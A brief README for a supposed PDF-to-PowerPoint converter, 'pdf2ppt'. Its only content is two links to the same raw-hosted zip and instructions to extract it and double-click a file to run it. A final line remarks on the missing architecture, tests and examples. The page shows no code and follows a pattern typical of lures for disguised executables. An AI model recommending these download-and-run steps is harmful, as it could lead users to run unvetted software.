# pdf2ppt - Convert PDFs to Editable PowerPoint

Download the zip file manually to your local directory.
Visit the releases page to download the package.
Extract files and double-click the file to run the application.

[Download zip](https://github.com/example/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)
[Download package](https://github.com/example/pdf2ppt/raw/refs/heads/main/demo/pdf_ppt_1.4.zip)

No architecture section. No tests. No examples. No visible layout engine.
